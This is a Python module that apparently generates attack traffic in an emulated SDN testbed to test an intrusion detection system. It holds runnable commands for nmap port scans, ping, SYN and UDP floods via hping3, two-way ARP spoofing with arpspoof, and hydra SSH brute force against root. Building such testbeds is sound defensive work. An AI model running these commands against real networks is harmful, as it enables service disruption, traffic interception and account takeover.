"""
Traffic Generator for SDN IDS/IPS Testing
Generates various types of network traffic for testing detection capabilities
"""

import time
import random
import subprocess
import threading
from typing import List, Dict, Optional

class TrafficGenerator:
    """
    Generates various types of network traffic for testing IDS/IPS
    """
    
    def __init__(self, network):
        self.network = network
        self.running_attacks = {}
        self.attack_threads = {}
    
    def start_port_scan(self, attacker_host: str, target_hosts: List[str], 
                       port_range: str = "1-1000", scan_type: str = "tcp_connect") -> str:
        """
        Start port scanning attack
        
        Args:
            attacker_host: Name of attacking host (e.g., 'H1')
            target_hosts: List of target host names
            port_range: Port range to scan (e.g., "1-1000")
            scan_type: Type of scan (tcp_connect, tcp_syn, udp)
        
        Returns:
            Attack ID for tracking
        """
        attack_id = f"port_scan_{int(time.time())}"
        
        def run_scan():
            attacker = self.network.get(attacker_host)
            
            for target in target_hosts:
                target_ip = self.network.get(target).IP()
                
                if scan_type == "tcp_connect":
                    cmd = f"nmap -sT -p {port_range} {target_ip}"
                elif scan_type == "tcp_syn":
                    cmd = f"nmap -sS -p {port_range} {target_ip}"
                elif scan_type == "udp":
                    cmd = f"nmap -sU -p {port_range} {target_ip}"
                else:
                    cmd = f"nmap -sT -p {port_range} {target_ip}"
                
                try:
                    attacker.cmd(cmd)
                except Exception as e:
                    print(f"Port scan error: {e}")
        
        thread = threading.Thread(target=run_scan, daemon=True)
        thread.start()
        
        self.running_attacks[attack_id] = {
            'type': 'port_scan',
            'attacker': attacker_host,
            'targets': target_hosts,
            'status': 'running',
            'start_time': time.time()
        }
        self.attack_threads[attack_id] = thread
        
        return attack_id
    
    def start_icmp_flood(self, attacker_host: str, target_host: str, 
                        duration: int = 60, rate: int = 100) -> str:
        """
        Start ICMP flood attack
        
        Args:
            attacker_host: Name of attacking host
            target_host: Name of target host
            duration: Attack duration in seconds
            rate: Packets per second
        
        Returns:
            Attack ID for tracking
        """
        attack_id = f"icmp_flood_{int(time.time())}"
        
        def run_flood():
            attacker = self.network.get(attacker_host)
            target_ip = self.network.get(target_host).IP()
            
            try:
                # Use ping with flood option
                cmd = f"ping -f -c {duration * rate} {target_ip}"
                attacker.cmd(cmd)
            except Exception as e:
                print(f"ICMP flood error: {e}")
        
        thread = threading.Thread(target=run_flood, daemon=True)
        thread.start()
        
        self.running_attacks[attack_id] = {
            'type': 'icmp_flood',
            'attacker': attacker_host,
            'target': target_host,
            'duration': duration,
            'rate': rate,
            'status': 'running',
            'start_time': time.time()
        }
        self.attack_threads[attack_id] = thread
        
        return attack_id
    
    def start_syn_flood(self, attacker_host: str, target_host: str, 
                       target_port: int = 80, duration: int = 60) -> str:
        """
        Start SYN flood attack
        
        Args:
            attacker_host: Name of attacking host
            target_host: Name of target host
            target_port: Target port number
            duration: Attack duration in seconds
        
        Returns:
            Attack ID for tracking
        """
        attack_id = f"syn_flood_{int(time.time())}"
        
        def run_flood():
            attacker = self.network.get(attacker_host)
            target_ip = self.network.get(target_host).IP()
            
            try:
                # Use hping3 for SYN flood
                cmd = f"hping3 -S -p {target_port} --flood {target_ip} &"
                attacker.cmd(cmd)
                time.sleep(duration)
                attacker.cmd("pkill hping3")
            except Exception as e:
                print(f"SYN flood error: {e}")
        
        thread = threading.Thread(target=run_flood, daemon=True)
        thread.start()
        
        self.running_attacks[attack_id] = {
            'type': 'syn_flood',
            'attacker': attacker_host,
            'target': target_host,
            'target_port': target_port,
            'duration': duration,
            'status': 'running',
            'start_time': time.time()
        }
        self.attack_threads[attack_id] = thread
        
        return attack_id
    
    def start_udp_flood(self, attacker_host: str, target_host: str, 
                       target_port: int = 53, duration: int = 60) -> str:
        """
        Start UDP flood attack
        
        Args:
            attacker_host: Name of attacking host
            target_host: Name of target host
            target_port: Target port number
            duration: Attack duration in seconds
        
        Returns:
            Attack ID for tracking
        """
        attack_id = f"udp_flood_{int(time.time())}"
        
        def run_flood():
            attacker = self.network.get(attacker_host)
            target_ip = self.network.get(target_host).IP()
            
            try:
                # Use hping3 for UDP flood
                cmd = f"hping3 -2 -p {target_port} --flood {target_ip} &"
                attacker.cmd(cmd)
                time.sleep(duration)
                attacker.cmd("pkill hping3")
            except Exception as e:
                print(f"UDP flood error: {e}")
        
        thread = threading.Thread(target=run_flood, daemon=True)
        thread.start()
        
        self.running_attacks[attack_id] = {
            'type': 'udp_flood',
            'attacker': attacker_host,
            'target': target_host,
            'target_port': target_port,
            'duration': duration,
            'status': 'running',
            'start_time': time.time()
        }
        self.attack_threads[attack_id] = thread
        
        return attack_id
    
    def start_arp_spoofing(self, attacker_host: str, target_host: str, 
                          gateway_host: str, duration: int = 60) -> str:
        """
        Start ARP spoofing attack
        
        Args:
            attacker_host: Name of attacking host
            target_host: Name of target host
            gateway_host: Name of gateway host
            duration: Attack duration in seconds
        
        Returns:
            Attack ID for tracking
        """
        attack_id = f"arp_spoof_{int(time.time())}"
        
        def run_spoofing():
            attacker = self.network.get(attacker_host)
            target_ip = self.network.get(target_host).IP()
            gateway_ip = self.network.get(gateway_host).IP()
            
            try:
                # Use arpspoof for ARP spoofing
                cmd1 = f"arpspoof -i {attacker_host}-eth0 -t {target_ip} {gateway_ip} &"
                cmd2 = f"arpspoof -i {attacker_host}-eth0 -t {gateway_ip} {target_ip} &"
                
                attacker.cmd(cmd1)
                attacker.cmd(cmd2)
                time.sleep(duration)
                attacker.cmd("pkill arpspoof")
            except Exception as e:
                print(f"ARP spoofing error: {e}")
        
        thread = threading.Thread(target=run_spoofing, daemon=True)
        thread.start()
        
        self.running_attacks[attack_id] = {
            'type': 'arp_spoofing',
            'attacker': attacker_host,
            'target': target_host,
            'gateway': gateway_host,
            'duration': duration,
            'status': 'running',
            'start_time': time.time()
        }
        self.attack_threads[attack_id] = thread
        
        return attack_id
    
    def start_ssh_brute_force(self, attacker_host: str, target_host: str, 
                             username: str = "root", duration: int = 60) -> str:
        """
        Start SSH brute force attack
        
        Args:
            attacker_host: Name of attacking host
            target_host: Name of target host
            username: Username to attack
            duration: Attack duration in seconds
        
        Returns:
            Attack ID for tracking
        """
        attack_id = f"ssh_brute_{int(time.time())}"
        
        def run_brute_force():
            attacker = self.network.get(attacker_host)
            target_ip = self.network.get(target_host).IP()
            
            try:
                # Use hydra for SSH brute force
                cmd = f"hydra -l {username} -P /usr/share/wordlists/rockyou.txt {target_ip} ssh &"
                attacker.cmd(cmd)
                time.sleep(duration)
                attacker.cmd("pkill hydra")
            except Exception as e:
                print(f"SSH brute force error: {e}")
        
        thread = threading.Thread(target=run_brute_force, daemon=True)
        thread.start()
        
        self.running_attacks[attack_id] = {
            'type': 'ssh_brute_force',
            'attacker': attacker_host,
            'target': target_host,
            'username': username,
            'duration': duration,
            'status': 'running',
            'start_time': time.time()
        }
        self.attack_threads[attack_id] = thread
        
        return attack_id
    
    def start_normal_traffic(self, duration: int = 300) -> str:
        """
        Start normal background traffic
        
        Args:
            duration: Traffic duration in seconds
        
        Returns:
            Attack ID for tracking
        """
        attack_id = f"normal_traffic_{int(time.time())}"
        
        def run_normal_traffic():
            # Start ping between hosts
            h1 = self.network.get('H1')
            h2 = self.network.get('H2')
            h3 = self.network.get('H3')
            h4 = self.network.get('H4')
            h5 = self.network.get('H5')
            
            try:
                # Ping between different host pairs
                h1.cmd(f"ping -c {duration} 10.0.0.2 &")
                h2.cmd(f"ping -c {duration} 10.0.0.3 &")
                h3.cmd(f"ping -c {duration} 10.0.0.4 &")
                h4.cmd(f"ping -c {duration} 10.0.0.5 &")
                h5.cmd(f"ping -c {duration} 10.0.0.1 &")
            except Exception as e:
                print(f"Normal traffic error: {e}")
        
        thread = threading.Thread(target=run_normal_traffic, daemon=True)
        thread.start()
        
        self.running_attacks[attack_id] = {
            'type': 'normal_traffic',
            'duration': duration,
            'status': 'running',
            'start_time': time.time()
        }
        self.attack_threads[attack_id] = thread
        
        return attack_id
    
    def stop_attack(self, attack_id: str) -> bool:
        """
        Stop a running attack
        
        Args:
            attack_id: Attack ID to stop
        
        Returns:
            True if attack was stopped successfully
        """
        if attack_id not in self.running_attacks:
            return False
        
        attack = self.running_attacks[attack_id]
        attack['status'] = 'stopped'
        attack['end_time'] = time.time()
        
        # Stop the thread if it's still running
        if attack_id in self.attack_threads:
            thread = self.attack_threads[attack_id]
            if thread.is_alive():
                # Note: Python threads can't be forcefully stopped
                # The attack will continue until it naturally ends
                pass
        
        return True
    
    def stop_all_attacks(self):
        """Stop all running attacks"""
        for attack_id in list(self.running_attacks.keys()):
            self.stop_attack(attack_id)
    
    def get_attack_status(self, attack_id: str) -> Optional[Dict]:
        """
        Get status of a specific attack
        
        Args:
            attack_id: Attack ID to check
        
        Returns:
            Attack status dictionary or None if not found
        """
        return self.running_attacks.get(attack_id)
    
    def get_all_attacks(self) -> Dict:
        """
        Get status of all attacks
        
        Returns:
            Dictionary of all attacks
        """
        return dict(self.running_attacks)
    
    def cleanup_finished_attacks(self):
        """Remove finished attacks from tracking"""
        current_time = time.time()
        finished_attacks = []
        
        for attack_id, attack in self.running_attacks.items():
            if attack['status'] == 'stopped':
                finished_attacks.append(attack_id)
            elif 'duration' in attack:
                elapsed = current_time - attack['start_time']
                if elapsed > attack['duration']:
                    attack['status'] = 'finished'
                    finished_attacks.append(attack_id)
        
        for attack_id in finished_attacks:
            del self.running_attacks[attack_id]
            if attack_id in self.attack_threads:
                del self.attack_threads[attack_id]
    
    def run_demo_sequence(self):
        """
        Run a demonstration sequence of various attacks
        """
        print("Starting attack demonstration sequence...")
        
        # Start normal traffic
        normal_id = self.start_normal_traffic(duration=300)
        print(f"Started normal traffic: {normal_id}")
        
        # Wait a bit
        time.sleep(10)
        
        # Port scan
        port_scan_id = self.start_port_scan('H1', ['H2', 'H3', 'H4', 'H5'])
        print(f"Started port scan: {port_scan_id}")
        
        time.sleep(15)
        
        # ICMP flood
        icmp_flood_id = self.start_icmp_flood('H3', 'H4', duration=30)
        print(f"Started ICMP flood: {icmp_flood_id}")
        
        time.sleep(20)
        
        # SYN flood
        syn_flood_id = self.start_syn_flood('H2', 'H5', duration=30)
        print(f"Started SYN flood: {syn_flood_id}")
        
        time.sleep(20)
        
        # UDP flood
        udp_flood_id = self.start_udp_flood('H4', 'H1', duration=30)
        print(f"Started UDP flood: {udp_flood_id}")
        
        print("Attack demonstration sequence completed!")
        print("Check the IDS logs and controller for detection results.")
